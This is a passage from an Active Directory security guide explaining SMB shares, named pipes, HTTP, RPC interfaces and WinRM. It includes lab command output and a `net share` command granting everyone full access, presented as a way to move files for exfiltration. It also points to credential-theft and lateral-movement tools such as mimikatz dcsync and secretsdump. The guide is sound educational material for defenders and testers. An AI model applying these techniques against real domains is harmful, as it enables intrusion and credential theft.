</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>ADMIN$      Disk           Remote Admin
</span></span><span style="display:flex;"><span>C$          Disk           Default share
</span></span><span style="display:flex;"><span>IPC$        IPC            Remote IPC
</span></span><span style="display:flex;"><span>NETLOGON    Disk           Logon server share
</span></span><span style="display:flex;"><span>SYSVOL      Disk           Logon server share
</span></span><span style="display:flex;"><span>The command completed successfully.</span></span></code></pre></div>
</div>
<figcaption>
Shares of the domain DC
</figcaption>
</figure>
<p>
You can access to the shares of other computers in similar way that you would
access a folder in your local machine. For accessing a share, you can use the
a UNC path like <code class="verbatim">\\dc01.contoso.local\SYSVOL\</code> or map the remote share to a
local device by using <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/gg651155(v=ws.11)">net use</a> command.</p>
<p>
To refer to the target computer in the UNC path, you can use its dns name or its
NetBIOS name. For example <code>net view \\dc01.contoso.local</code> or <code>net view \\dc01</code>. </p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt; dir \\dc01\sysvol</span>
</span></span><span style="display:flex;"><span> Volume in drive \\dc01\sysvol has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is 609D-528B
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of \\dc01\sysvol
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>28/11/2020  11:02    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>28/11/2020  11:02    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>28/11/2020  11:02    &lt;JUNCTION&gt;     contoso.local [C:\Windows\SYSVOL\domain]
</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
</span></span><span style="display:flex;"><span>               3 Dir(s)  20,050,214,912 bytes free</span></span></code></pre></div>
</div>
<figcaption>
List folders inside a share
</figcaption>
</figure>
<p>
Shares are very useful for users in order to access to files of other machines
without really need to worry about using an special program or something like
that. Hence, they are also very practical for attackers to move files from
one computer to another in order to exfiltrate them.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>net share Temp=C:\Temp /grant:everyone,FULL</span></span></code></pre></div>
</div>
<figcaption>
Creating a shared that can be accesed by everyone
</figcaption>
</figure>
<div id="outline-container-default-shares" class="outline-5">
<h5 id="default-shares">
Default shares
</h5>
<div id="outline-text-default-shares" class="outline-text-5">
<p>
 You may notice previously that there are some shares that finished with <code class="verbatim">$</code>.
 These shares are <code class="verbatim">C$</code>, <code class="verbatim">ADMIN$</code> and <code class="verbatim">IPC$</code> and they are present by default in
 any Windows computer.</p>
<p>
 In order to access to <code class="verbatim">C$</code> and <code class="verbatim">ADMIN$</code> you are required to have Administrator
 privileges in the target computer. With these shares (specially <code class="verbatim">C$</code>) you can
 inspect all the computer files. Actually, these shares are used by several
 tools. For example, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> uses <code class="verbatim">ADMIN$</code> to deploy a binary on charge of
 executing the given command.</p>
<p>
 The <code class="verbatim">IPC$</code> shared is an special shared used to create <a href="#named-pipes">named pipes</a>.</p>
</div>
</div>
<div id="outline-container-default-domain-shares" class="outline-5">
<h5 id="default-domain-shares">
Default domain shares
</h5>
<div id="outline-text-default-domain-shares" class="outline-text-5">
<p>
 Apart from the common shares, in a domain, the Domain Controllers also publish
 the <code class="verbatim">SYSVOL</code> and the <code class="verbatim">NETLOGON</code> shares that are available for any user/computer
 in the domain. They are used to store files that need to be accessed by all the
 machines (at least Windows machines) of the domain.</p>
<p>
 The <code class="verbatim">SYSVOL</code> share is commonly used to store the Group Policy templates used by
 the computers to read the Group Policies deployed in the domain.
 <a href="https://adsecurity.org/?p=2288">Sometimes these policies contains passwords</a>. You can access to the SYSVOL share
 with the <code class="verbatim">\\&lt;domain&gt;\SYSVOL</code> UNC path.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PS C:\&gt; dir \\contoso.local\SYSVOL\contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Directory: \\contoso.local\SYSVOL\contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode                 LastWriteTime         Length Name
</span></span><span style="display:flex;"><span>----                 -------------         ------ ----
</span></span><span style="display:flex;"><span>d-----        19/04/2021     17:12                Policies
</span></span><span style="display:flex;"><span>d-----        28/11/2020     10:02                scripts</span></span></code></pre></div>
</div>
<figcaption>
List SYSVOL folders
</figcaption>
</figure>
<p>
 The <code class="verbatim">\\&lt;domain&gt;\\SYSVOL\&lt;domain&gt;\scripts</code> policy is an alias for the <code class="verbatim">NETLOGON</code>
 share. The NETLOGON share is used to store the logon scripts that need to be
 executed for the computers of the domain.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-named-pipes" class="outline-4">
<h4 id="named-pipes">
Named pipes
</h4>
<div id="outline-text-named-pipes" class="outline-text-4">
<p>
 The <code class="verbatim">IPC$</code> share is not a directory, but it is used to create <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipes</a>, that
 allow processes of different computers interact between them with mechanisms
 like <a href="#rpc">RPC</a> (Remote Procedure Calls).</p>
<p>
 Named pipes can be seen as TCP ports that allows machines communicate between
 them, but inside of the SMB protocol. They are used to do RPC calls, allowing a
 lot of protocols to communicate over SMB.</p>
<p>
 Usually the protocols that work over the RPC/SMB stack defines a known named
 pipe that can be used to contact with the remote service (same idea as TCP/UDP
 ports). For example, RPC uses the <code class="verbatim">\pipe\netlogon</code> named pipe to exchange the
 messages of the Netlogon protocol. </p>
</div>
</div>
</div>
</div>
<div id="outline-container-http" class="outline-3">
<h3 id="http">
HTTP
</h3>
<div id="outline-text-http" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol">HTTP</a> (Hypertext Transfer Protocol) is probably the most famous application
protocol out there, since it is the protocol of the web. But apart from its
major role in Internet, is also commonly used in Active Directory.</p>
<p>
HTTP is used as transport protocol by many other application protocols that are
present in a Active Directory domain like <a href="#winrm">WinRM</a> (and thus <a href="#powershell-remoting">Powershell Remoting</a>),
<a href="#rpc">RPC</a> or <a href="#adws">ADWS</a> (Active Directory Web Services).</p>
<figure>
<pre class="example">                                 .----------
                                 |
                               .---
                      .-------&gt;| 80 HTTP / WebDAV
                      |        '---
                      |          |
                      |          |
                      |        .---
                      |-------&gt;| 443 HTTPS / WebDAV / PSWA
                      |        '---
                      |          |
                      |          |
                      |        .---
                      |-------&gt;| 593 RPC over HTTP Endpoint Mapper
                      |        '---  
        .---------.   |          |
        | HTTP(S) |&gt;--|          |
        '---------'   |        .---
             |        |-------&gt;| 5985 WinRM HTTP
             |        |        '---
             |        |          |
             |        |          |
             |        |        .---
             |        |-------&gt;| 5986 WinRM HTTPS
             |        |        '---
             |        |          |
             |        |          |
             |        |        .---
             |        '-------&gt;| 9389 ADWS (on DCs)
             |                 '---
             |                   |
             |                   '----------
      .-------------.
      |             |
  .------.     .----------.
  | NTLM |     | Kerberos |
  '------'     '----------'
</pre>
<figcaption>
Ports used by HTTP services in Active Directory
</figcaption>
</figure>
<p>
In order to be fully integrated with Active Directory, HTTP supports
authentication with both NTLM and Kerberos. This is important from a security
perspective since it implies that HTTP connections are susceptible of suffering
from Kerberos Delegation or <a href="https://en.hackndo.com/ntlm-relay/#what-can-be-relayed">NTLM Relay</a> attacks.</p>
<p>
In the case of NTLM relay is specially important to note that HTTP connections
don't required signing, so are very susceptible to NTLM cross relay attacks. In
fact, there are many attacks like the <a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">PrivExchange</a> or some
<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe">Kerberos RBCD computer takeover</a> that rely in NTLM relay from HTTP to LDAP. If
you able to coerce a computer to perform an HTTP request using the computer
domain account with NTLM authentication , then you can compromise the computer
with a <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-2-windows-1020162019-lpe">little of Kerberos RBCD magic</a>.  </p>
<p>
Related to HTTP, in Windows machines you can install the <a href="https://www.iis.net/">IIS</a> web server, that is
the basis for some technologies like <a href="https://en.wikipedia.org/wiki/WebDAV">WebDAV</a> or PSWA (Powershell Web Access),
that can be enabled in the <code class="verbatim">/pswa</code> endpoint.</p>
<figure>
<img src="./pswa.png" alt="./pswa.png" title="./pswa.png"><figcaption>
PSWA login
</figcaption>
</figure>
<p>
Moreover, you can create a SOCKS proxy over HTTP in a IIS installation by using
<a href="https://github.com/blackarrowsec/pivotnacci">pivotnacci</a>.</p>
</div>
</div>
<div id="outline-container-rpc" class="outline-3">
<h3 id="rpc">
RPC
</h3>
<div id="outline-text-rpc" class="outline-text-3">
<p>
<a href="https://en.wikipedia.org/wiki/Remote_procedure_call">RPC</a> (Remote Procedure Call) is a protocol that allows programs from different
machines communicate between them by calling functions over the network.
Microsoft have developed a RPC protocol called <a href="https://en.wikipedia.org/wiki/Microsoft_RPC">MSRPC</a>, that is a modified version
of <a href="https://en.wikipedia.org/wiki/DCE/RPC">DCE/RPC</a> with some extensions (defined in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15">RPCE</a>).</p>
<p>
MSRPC can use different <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/472083a9-56f1-4d81-a208-d18aef68c101">protocols for transport</a>, like:</p>
<ul>
<li>TCP, by using the port 135 for the Endpoint Mapper and ports from 49152 to
65535 as endpoints</li>
<li>SMB by using the named pipes</li>
<li>NetBIOS</li>
<li>HTTP, by using the port 593 for the Endpoint Mapper and ports from 49152 to
65535 as endpoints</li>
</ul>
<figure>
<pre class="example">                                                 .---
             .-----&gt;-----------&gt;----------------&gt;| 135 Endpoint Mapper
             |                                   '---
             |
             |                       .-------.   .---
             |-----&gt;------------.---&gt;| NBSSN |--&gt;| 139
             |                  |    '-------'   '---
             |                  ^
 .-----.     |      .-----.     |                .---
 | RPC |&gt;----|-----&gt;| SMB |&gt;----'---------------&gt;| 445
 '-----'     |      '-----'                      '---
    |        |         |
    |        |         |        .------.         .---
    |        |-----&gt;---|-------&gt;| HTTP |&gt;--.----&gt;| 593 Endpoint Mapper
    |        |         |        '------'   |     '---
    |        |         |           |       v
    |        |         |           |       |     .---
    |        '-----&gt;---|-------&gt;---|-------'----&gt;| 49152 - 65535
    |                  |           |             '---
    |                  |           |
    '-----------------.'-----------'
                      |
                .-----'-----.
                |           |
             .------.  .----------.
             | NTLM |  | Kerberos |
             '------'  '----------'
</pre>
<figcaption>
RPC related protocols and ports
</figcaption>
</figure>
<p>
In a domain, MSRPC is constantly used by computers to communicate between them.
Windows machines use MSRPC for a lot of different tasks, such as manage the
services or read the registry of other machines.</p>
<blockquote>
<p>RPC is also widely used to communicate programs in the local machine through
LRPC (Local RPC) or <a href="https://www.youtube.com/watch?v=D-F5RxZ_yXc">ALPC</a> (Advanced Local Procedure Call).</p>
</blockquote>
<p>
For perform all those tasks, Microsoft have define several MSRPC interfaces,
that define different functions, which allows to query/call different services
of the computer from a remote program.</p>
<p>
Each interface is identified by a UUID (Universally unique identifier) like
<code class="verbatim">12345778-1234-ABCD-EF00-0123456789AB</code>, and for each interface different
endpoints are used. Several interfaces have predefined endpoints, such as named
pipes. For example, the Service Control Manager (SCMR) uses the <code class="verbatim">\PIPE\svcctl</code>
named pipe.</p>
<p>
However, for other interfaces the remote endpoint changes, so in order to
determine it, the RPC client has to contact the Endpoint Mapper (EPM) to resolve
the remote endpoint from the GUID.</p>
<p>
Depending on the interface, different transport protocols can be used. You can
use the impacket <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py">rpcdump.py</a> and <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcmap.py">rpcmap.py</a> utilities to discover the RPC
endpoints (and their protocols) that can be used for connecting to a given
service in a remote machine. Additionally, you can explore the RPC endpoints in
your local machine by using <a href="https://www.rpcview.org/">RpcView</a>.</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python rpcdump.py <span style="color:#e6db74">'contoso.local/Han:Solo1234!@192.168.100.2'</span> | grep LSAT -A <span style="color:#ae81ff">20</span> | grep -v ncalrpc
</span></span><span style="display:flex;"><span>Protocol: <span style="color:#f92672">[</span>MS-LSAT<span style="color:#f92672">]</span>: Local Security Authority <span style="color:#f92672">(</span>Translation Methods<span style="color:#f92672">)</span> Remote 
</span></span><span style="display:flex;"><span>Provider: lsasrv.dll 
</span></span><span style="display:flex;"><span>UUID    : 12345778-1234-ABCD-EF00-0123456789AB v0.0 
</span></span><span style="display:flex;"><span>Bindings: 
</span></span><span style="display:flex;"><span>          ncacn_np:<span style="color:#ae81ff">\\</span>DC01<span style="color:#f92672">[</span><span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\l</span>sass<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>          ncacn_ip_tcp:192.168.100.2<span style="color:#f92672">[</span>49667<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>          ncacn_http:192.168.100.2<span style="color:#f92672">[</span>49669<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>          ncacn_np:<span style="color:#ae81ff">\\</span>DC01<span style="color:#f92672">[</span><span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\c</span>b4e7232b43a99b8<span style="color:#f92672">]</span></span></span></code></pre></div>
</div>
<figcaption>
List remote endpoints of LSAT interface
</figcaption>
</figure>
<p>
To give you an idea of what can be done with RPC, here are the descriptions of
some of the most used interfaces. I have divided the interfaces by transport
protocols in order to allow you to know what can be accomplished when different
ports of the machine are open.</p>
<div id="outline-container-rpc-over-smb" class="outline-4">
<h4 id="rpc-over-smb">
RPC over SMB
</h4>
<div id="outline-text-rpc-over-smb" class="outline-text-4">
<p>
The following RPC interface/protocols can be (and they are commonly) used
through SMB:</p>
<dl>
<dt>
DHCPM
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4">DHCPM</a> (DHCP Server Management) is used to manage the configuration of
a DHCP server.</dd>
<dt>
RPRN
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1">RPRN</a> (Print System Remote) is used to manage prints from a remote
computer. You can use <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> or <a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a> to trigger the <a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory/41">printer bug</a>
trough RPRN.</dd>
<dt>
RRP
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/MS-RRP/0fa3191d-bb79-490a-81bd-54c2601b7a78">RRP</a> (Windows Remote Registry Protocol) allows to read and modify the
registry keys from a remote computer. You can use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg">reg</a> (if "The network path was
not found." error is printed, you need to <a href="https://msfn.org/board/topic/151891-windows-reg-command-across-network/">start the "Remote Registry" service</a>
in the remote machine) or <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py">reg.py</a> (this automatically starts the "Remote
Registry" service with SRVS) to manipulate the remote registry.</dd>
<dt>
SAMR
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380">SAMR</a> (SAM Remote) allows to connect the SAM (Security Account
Manager) of other computers, in order to manage users and groups. You can also
use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py">samrdump.py</a> to get information about local users of the machine.</dd>
<dt>
SCMR
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/705b624a-13de-43cc-b8a2-99573da3635f">SCMR</a> (SCM Remote) is used to connect with the <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager">SCM</a> (Service Control
Manager) of other machines, in order to manage the services. Is the protocol
used by the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> utility to execute commands in remote machines.</dd>
<dt>
SRVS
</dt>
<dd>Through <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9">SRVS</a> (Server Service Remote) is possible to connect to a
remote machine in order to manage connections, sessions, shares, files and
transport protocols. You can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/netview.py">netview.py</a> to enumerate sessions or <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875576(v=ws.11)">net view</a>
to enumerate shares in remote machines.</dd>
<dt>
TSCH
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931">TSCH</a> (Task Scheduler Service Remote) is used to manage tasks in remote
computers. You can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">atexec.py</a>, <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/use-at-command-to-schedule-tasks">at</a> or <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">schtasks</a> to create remote tasks.</dd>
<dt>
WKST
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/5bb08058-bc36-4d3c-abeb-b132228281b7">WKST</a> (Workstation Service Remote) is used to manage/query some
workstation setting
s as hostname, OS version, user sessions or computer
domain. You can use WKST with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/netview.py">netview.py</a> to enumerate sessions.</dd>
</dl>
<figure>
<pre class="example"> .-------.
 | DHCPM |&gt;----.
 '-------'     |
               |
  .------.     |
  | RPRN |&gt;----|
  '------'     |
               |
  .------.     |                                          .--------
  | RRP  |&gt;----|                                          |
  '------'     |                                          |
               |                                        .---
  .------.     |                             .--NBSSN--&gt;| 139
  | SAMR |&gt;----|                             |          '---
  '------'     |      .------.     .-----.   |            |  Windows
               |-----&gt;| RPC  |&gt;---&gt;| SMB |&gt;--|            |
  .------.     |      '------'     '-----'   |            |  machine
  | SCMR |&gt;----|                      |      |          .---
  '------'     |                      |      '---TCP---&gt;| 445
               |                      |                 '---
  .------.     |                      |                   |
  | SRVS |&gt;----|                      |                   |
  '------'     |                      |                   '--------
               |               .------------.
  .------.     |               |            |
  | TSCH |&gt;----|            .------.   .----------.
  '------'     |            | NTLM |   | Kerberos |
               |            '------'   '----------'
  .------.     |
  | WKST |&gt;----'
  '------'
</pre>
<figcaption>
RPC protocols that works over SMB
</figcaption>
</figure>
<p>
Additionally, there are some RPC interfaces that are specific to be used in a
domain to query a Domain Controllers:</p>
<dl>
<dt>
BKRP
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/90b08be4-5175-4177-b4ce-d920d797e3a8">BKRP</a> (BackupKey Remote Protocol) is used to transmit DPAPI keys in an
Active Directory domain. You can use <a href="https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz#_Toc64019558">mimikatz lsadump::backupkeys</a> or
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py">dpapi.py backupkeys</a> to retrieve the DPAPI backup keys from a domain
controller.</dd>
<dt>
LSAD
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc">LSAD</a> (LSA Domain Policy) is a remote interface for LSA (Local Security
Authority) to manage users, trusts and other stuff related with security. Is
used along with LSAT.</dd>
<dt>
LSAT
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsat/1ba21e6f-d8a9-462c-9153-4375f2020894">LSAT</a> (LSA Translations Methods) allows to translate SIDs to principal
names. Is used along with LSAD. You can use <a href="https://github.com/SecureAuthCorp/impacket/blob/a45f331360ce2abdb1c517a35a1c407725b0d761/examples/lookupsid.py">lookupsid.py</a> to enumerate users
based on the SIDs.</dd>
<dt>
NRPC
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f">NRPC</a> (Netlogon Remote Protocol) is used in domains to allow computers
to authenticate users by querying the domain controller. Is also used between
domain controllers of different domains in order to authenticate users of
different domains with NTLM. Additionally it allows to obtain information such
as users information, domain trusts or domain controllers list. You can use
the <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731935(v=ws.11)">nltest</a> (Netlogon test) to perform several requests. This protocol is also
known by the <a href="https://www.secura.com/blog/zero-logon">Zerologon</a> vulnerability. </dd>
</dl>
<figure>
<pre class="example">  .------.                                                .----------
  | BKRP |&gt;----.                                          |
  '------'     |                                          |
               |                                        .---
  .------.     |                             .--NBSSN--&gt;| 139
  | LSAD |&gt;----|                             |          '---
  '------'     |      .------.     .-----.   |            |    Domain
               |-----&gt;| RPC  |&gt;---&gt;| SMB |&gt;--|            |  
  .------.     |      '------'     '-----'   |            |  Controller
  | LSAT |&gt;----|                      |      |          .---
  '------'     |                      |      '---TCP---&gt;| 445
               |                      |                 '---
  .------.     |                      |                   |
  | NRPC |&gt;----'                      |                   |
  '------'                            |                   '----------
                               .------------.
                               |            |
                            .------.   .----------.
                            | NTLM |   | Kerberos |
                            '------'   '----------'
</pre>
<figcaption>
RPC protocols that works over SMB (Domain Controller)
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-rpc-over-tcp" class="outline-4">
<h4 id="rpc-over-tcp">
RPC over TCP
</h4>
<div id="outline-text-rpc-over-tcp" class="outline-text-4">
<p>
Moreover, there are some RPC interfaces that cannot be used over SMB, but you
can use them directly over TCP:</p>
<dl>
<dt>
DRSR
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRSR</a> (Directory Replication Service Remote) is the protocol used by
domain controllers to replicate data. It can be also used for an attacker with
enough privileges to replicate the domain users credentials by performing a
<a href="https://adsecurity.org/?p=1729">dcsync attack</a> with <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync">mimikatz lsadump::dcsync</a> or <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">impacket secretsdump.py</a>.</dd>
<dt>
DCOM
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0">DCOM</a> (Distributed COM) is used to interact with <a href="https://docs.microsoft.com/en-us/windows/win32/com/the-component-object-model">COM</a> (Component Object
Model) objects of remote computers. COM objects are very useful and can be
used for a lot of things, like executing commands, that can be accomplished by
using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py">dcomexec.py</a>.</dd>
<dt>
WMI
</dt>
<dd><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814">WMI</a> (Windows Management Instrumentation Remote) is the Microsoft
implementation of <a href="https://en.wikipedia.org/wiki/Common_Information_Model_(computing)">CIM</a> (Common Information Model) built on top of COM objects
that allows to query and manipulate different parts of a Windows machine from
a single interface. Is very versatile and can be used with <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic">wmic</a>, Powershell
cmdLets like <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> or impacket WMI scripts like <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a>.</dd>
<dt>
WCCE
</dt>
<dd>WCCE (Windows Client Certificate Enrollment Protocol) is a DCOM
interface that allows users to requests certificates and other services
related with CAs in <a href="#adcs">ADCS</a>. It can be used with <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certreq_1">certreq</a> or <a href="https://github.com/GhostPack/Certify">Certify</a>.</dd>
</dl>
<figure>
<pre class="example">                                                        .--------
        .-----------.                                   |
        | (DC) DRSR |&gt;-------.                          |
        '-----------'        |     .------.            .---
                             |----&gt;| RPC  |&gt;--TCP--.--&gt;| 135 (EPM)
 .-----.        .------.     |     '------'        |   '---
 | WMI |&gt;--.---&gt;| DCOM |&gt;----'        |            |     |  Windows
 '-----'   |    '------'              |            |     |
           |                          |            |     |  machine
 .------.  |                          |            |   .---
 | WCCE |&gt;-'                          |            '--&gt;| 49152 - 65535
 '------'                             |                '---  
                                      |                  |
                                      |                  |
                                .------------.           '--------
                                |            |
                             .------.   .----------.
                             | NTLM |   | Kerberos |
                             '------'   '----------'
</pre>
<figcaption>
RPC protocols that works over TCP
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-winrm" class="outline-3">
<h3 id="winrm">
WinRM
</h3>
<div id="outline-text-winrm" class="outline-text-3">
<p>
Apart from RPC, there is also possible to use WinRM (Windows Remote Management)
to communicate and execute operations in other machines. WinRM is the Microsoft
implementation of the <a href="https://en.wikipedia.org/wiki/WS-Management">WS-Management</a> (Web Services-Management) specification that
defines a protocol for managing computers by using SOAP over HTTP.</p>
<p>
WinRM uses some extensions that are defined in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsman/70912fec-c815-44ef-97c7-fc7f2ec7cda5">WSMAN</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsmv/055dc36b-db2a-41ae-a47b-82cbfa0b4a92">WSMV</a> for accessing CIM
objects in remote machines. These CIM objects are like an update to WMI objects.
You can access to CIM objects in local and remote machines with the <a href="https://devblogs.microsoft.com/powershell/introduction-to-cim-cmdlets/">CIM Cmdlets</a>
such as <a href="https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance?view=powershell-7.1">Get-CimInstance</a>. Additionally, you can use also use <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs">winrs</a> to perform
actions in remote computers by using WinRM. </p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; Get-CimInstance CIM_OperatingSystem -ComputerName dc01 | Format-List
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SystemDirectory <span style="color:#960050;background-color:#1e0010">:</span> C:\Windows\system32
</span></span><span style="display:flex;"><span>Organization    <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>BuildNumber     <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">17763</span>
</span></span><span style="display:flex;"><span>RegisteredUser  <span style="color:#960050;background-color:#1e0010">:</span> Windows User
</span></span><span style="display:flex;"><span>SerialNumber    <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">00431</span>-<span style="color:#ae81ff">10000</span>-<span style="color:#ae81ff">00000</span>-AA522
</span></span><span style="display:flex;"><span>Version         <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">10.0</span>.17763
</span></span><span style="display:flex;"><span>PSComputerName  <span style="color:#960050;background-color:#1e0010">:</span> dc01</span></span></code></pre></div>
</div>
<figcaption>
Use CIM to get info from a remote computer
</figcaption>
</figure>
<p>
By default, WinRM service listen on port 5985 for HTTP connections and port 5986
for HTTPS connections. By default, HTTP is used, since the WinRM messages are
encrypted in a top layer. However, WinRM can be configured to
<a href="https://adamtheautomator.com/winrm-port/#h-setting-winrm-compatibility-ports">use the regular HTTP ports</a> 80 and 443 for HTTP and HTTPS connections
respectively. </p>
<figure>
<pre class="example">                                                               .----------
                                                               |
                                                               |
 .--------------------------------.                          .---
 |             WinRM              |                 .--TCP--&gt;| 5985 or 80
 |                                |                 |        '---
 | .-----.    .---------------.   |   .---------.   |          |  Windows
 | | CIM |---&gt;| WS-Management |&gt;--|--&gt;| HTTP(S) |&gt;--|          |  
 | '-----'    '---------------'   |   '---------'   |          |  Machine
 |                                |        |        |        .---
 '--------------------------------'        |        '--SSL--&gt;| 5986 or 443
                                           |                 '---
                                           |                   |
                                           |                   |
                                           |                   '----------
                                    .-------------.
                                    |             |
                                .------.     .----------.
                                | NTLM |     | Kerberos |
                                '------'     '----------'
</pre>
<figcaption>
WinRM protocol stack
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-powershell-remoting" class="outline-3">
<h3 id="powershell-remoting">
Powershell remoting
</h3>
<div id="outline-text-powershell-remoting" class="outline-text-3">
<p>
One great utility to manage systems is Powershell remoting, that allows the
client to establish a Powershell session on remote computers and perform all
